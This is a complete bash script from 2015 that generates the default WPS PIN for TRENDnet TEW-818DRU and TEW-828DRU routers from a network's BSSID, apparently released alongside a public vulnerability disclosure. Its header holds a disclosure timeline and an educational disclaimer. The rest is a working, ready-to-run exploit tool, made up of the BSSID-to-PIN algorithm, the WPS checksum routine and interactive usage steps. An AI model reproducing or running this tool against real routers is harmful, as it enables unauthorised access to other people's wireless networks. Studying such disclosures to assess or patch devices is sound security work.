#!/bin/bash 

VERSION=1.0   

#
#
#                          LEGAL ADVISORY
#
#  tdn.sh - copyleft 25th june 2015 (kcdtv for wifi-libre) 
#  tdn.sh is a bash script published under the terms of GPL v3 licence. You can modifie it and share it freely as long as you respect the rules established by the free software association ( visit for more details http://gplv3.fsf.org/ )
#  The author explicitly forbide any kind of comercial-capitalist use (direct or indirect)
#
#                             CREDITS  
#
#  breach and algorithm = kcdtv
#  code = kcdtv (with indirect participation from antares_145) 
#
#                            WEB SITEs
#
#  www.wifi-libre.com
#  www.crack-wifi.com
#
#                           DISCLAIMER
#
#  tdn.sh is a script created with educational purpose to ilustrate the security breach "TRENDnet TEW-818RDU PIN Disclosure" deasveled by the author the 28th of june 2015 in packet storm  
#  You can find it at https://packetstormsecurity.com/files/132477/TRENDnet-TEW-818RDU-PIN-Disclosure.html 
#  If you speak spanish you will find a detailed thread in the forum "wifi-libre" at https://www.wifi-libre.com/topic-162-tdnsh-generador-pin-paratrendnet-tew-818dru-ac1900-y-828dru-ac3200.html 
#
#                          AFFECTED DEVICES
#
#  TEW-818DRU (ac1900) : A dual-band acess point manufactured by TRENDnet 
#  TEW-828DRU (ac3200) : The very last model manufactured by TRENDnet with trial-band 
#
#                       DESCRIPTION OF THE BREACH  
#  
#    1) DANGEROUS WPS DEFAULT SETTINGS
#  WPS is enabled for all the networks (2.4Ghz and 5Ghz frecuencies ranges)
#  The PIN cannot be changed, it is permanent
#  The PIN is unique, it is the same for all the networks    
#   
#    2) PIN GENERATED WITH BSSID
#  It is made with the six last digits of the bSSID of the 2.4 Ghz network ("NIC" part). Anyone within the network range can gather this bssid and genrate the default PIN
#  The end half of this bssid is grabed and the first and last byte are inverted. Than the PIN is genrated by converting the string from hexadecimal to decimal
#
#                             TIMELINE
#
#  16-june-2014 : - I found the algorithm on a TEW-818DRU by  
#  17-june-2014 : - I write to TRENDnet to ask them if this is realy true
#  29-june-2014 : - As no asnwer is given I decide to fully disclose my research in crack-wifi.com http://www.crack-wifi.com/forum/topic-10657-trendnet-tew-818dru-ac19000-full-disclosure-wps-pin.html
#  february2015 : - I check on the web and find more datas taht confirm the breach (example : https://www.youtube.com/watch?v=HyfIX1B8cx0
#  25-june-2015 : - One year after i can check that the latest router (TEW-828DRU) also use this algorithm so I "fully dsiclose" this on my forum: https://www.wifi-libre.com/topic-160-algoritmo-pin-tew-818dru-ac1900-y-tew-828dru-ac3200-de-trendnet.html
#  28-06-2015   : - Published in english in packet storm : https://packetstormsecurity.com/files/132477/TRENDnet-TEW-818RDU-PIN-Disclosure.html 
#
#                        HOW TO USE THE SCRIPT
#
# 
# 1) Open a temrinal and locate yourself with "cd path_to_directory_where_you_have_the_script_tdn.sh" 
# 2) Launch the script with "bash tdn.sh"
#

               ##################################################################
               #                                                                #
               #             THE SCRIPT STARTS... ENJOY! :)                     #
               #                                                                #
               ##################################################################



NOcolor="\033[0;37m"                            # colors are defined in variables 
red="\033[1;31m"
purpple="\033[0;35m"
yellow="\033[1;33m"
white="\033[1;37m"
victorycolor="\033[1;43m"
green="\033[1;32m"                               
  

ALGORITHM(){
SCRAMBELDNIC=$(printf `echo $BSSID | awk -F':' '{ print $6 }'``echo $BSSID | awk -F':' '{ print $5 }'``echo $BSSID | awk -F':' '{ print $4 }'`) 
CONVERTEDMAC=$(printf '%d\n' 0x$SCRAMBELDNIC) # with awk + separator ":" we grab the fields 6,5,4 of bSSID inverting them. Result is "$SCRAMBLEDNIC" 
STRING=`expr '(' $CONVERTEDMAC '%' 10000000 ')'` #conversion to decimal ("$CONVERTEDMAC"); 1st digit is deleted if needed to get 7 digits in $STRING
}

CHECKSUM(){                                                                  # this function was created by antares_145 from crack-wifi.com
PIN=`expr 10 '*' $STRING`                                                    # to generate the WPS checksum 
ACCUM=0                                                                       
                                                             
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 10000000 ')' '%' 10 ')'`      
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 1000000 ')' '%' 10 ')'`        
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 100000 ')' '%' 10 ')'`         
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 10000 ')' '%' 10 ')'`         
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 1000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 100 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 10 ')' '%' 10 ')'`            

DIGIT=`expr $ACCUM '%' 10`                                                   
CHECKSUM=`expr '(' 10 '-' $DIGIT ')' '%' 10`                                 
PIN=$(printf '%08d\n' `expr $PIN '+' $CHECKSUM`)                             # End of the function - thanks Maestro! ;)
} 


until [ -n "$FIN" ] ;         # this until loop is used to indefintly laucnh the genrator until the ser choose to close it 
  do                                                                 
echo -e "
        $yellow .----------------.  .----------------.  .-----------------.
        $yellow| .--------------. || .--------------. || .--------------. |
        $yellow| |$red  _________ $yellow  | || |$red  ________ $yellow   | || |$red ____  _____$yellow  | |
        | |$red |  _   _  |$yellow  | || |$red |_   ___  .$yellow  | || |$red|_   \|_   _|$yellow | |
        | |$red |_/ | | \_|$yellow  | || |$red   | |    . \ $yellow| || |$red  |   \ | |$yellow   | |
        | |$red     | |    $yellow  | || |$red   | |    | | $yellow| || |$red  | |\ \| |$yellow   | |
        | |$red    _| |_   $yellow  | || |$red  _| |___.' / $yellow| || |$red _| |_\   |_ $yellow | |
        | |$red   |_____|  $yellow  | || |$red |________.'  $yellow| || |$red|_____|\____|$yellow | |
        | |              | || |              | || |              | |
        | '--------------' || '--------------' || '--------------' |$white.sh
        '----------------'  '----------------'  '----------------' 

$purpple PIN GENERATOR FOR$yellow TRENDNET$red TEW-818DRU$white ($red ac1900 $NOcolor) 
                                $purpple AND$yellow TRENDNET$red TEW-828DRU$white ($red ac3200 $NOcolor) 
                         
                          GPL.3 code by $yellow kcdtv$NOcolor for


$red www.wifi-libre.com                                         $yellow www.crack-wifi.com$NOcolor"  # welcome screen 
echo -e "$NOcolor"                                                                                   
echo -e "                    -------------------------------------"
echo -e "                            Enter the$white 2.4$NOcolor bSSID :$yellow"
read -n 17 -ep "                            " BSSID                       # bssid is entered by user and stored in $BSSID variable (read command)
echo -e "$NOcolor"
  while !(echo $BSSID | tr a-f A-F | egrep -q "^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$")
   do                                                                     # filter by antares_145 to check that bssid format is correct
     echo -e " $red Error :$white MAC No Conforme $NOcolor"
     echo -e "$yellow*$NOcolor bSSID has to be in it original format: 6 pairs of hexadecimal digits separated by two points  
 (ex:$red 00:90:4C:10:E4:D2$NOcolor )" 
    echo -e "                            Enter the$white 2.4$NOcolor bSSID :$yellow"
    read -n 17 -ep "                            " BSSID                       
    echo -e "$NOcolor"  
  done



OUI=$( echo $BSSID | cut -c -8 |  tr '[:lower:]' '[:upper:]')         # to avoid error lower case are converted to upper case
case $OUI in                             # control structure to define two beahviours
   D8:EB:97 | 00:14:D1 |  3C:8C:F8 )               # first behaviour : The Mac adress belongs to TRENDdnet
     echo -e "            $green    OUI-CHECK :$white mac adress belongs to TRENDnet"
     ALGORITHM                        
     CHECKSUM                         
     echo -e "

      $green      The default$yellow PIN$green for $yellow 5GHz$green and$yellow 2,4GHz$green networks is $victorycolor$PIN$NOcolor


$NOcolor                   for support visit $yellow www.wifi-libre.com$NOcolor 

                                     "
   ;;
   * )                           # second case : MAC adress is not from TRENDnet
     echo -e "         $red OUI-CHECK FAILED! This mac adress does not belong to TRENDnet!"
     ALGORITHM
     CHECKSUM
     echo -e "    $NOcolor                    (The PIN generated is $white$PIN$NOcolor)


$NOcolor                   for support visit $yellow www.wifi-libre.com$NOcolor 

                                     "        
   ;;
esac
echo -e "  If you want to :
   -$green Generate a PIN$NOcolor for an other device please press $yellow<ENTER>$NOcolor or $yellow<SPACE>$NOcolor
   -$red Exit the script$NOcolor just press$yellow any other key$NOcolor or$yellow <CTRL+C>$NOcolor
"
read -n 1 -ep " " FIN &>/dev/null
done
exit 0 
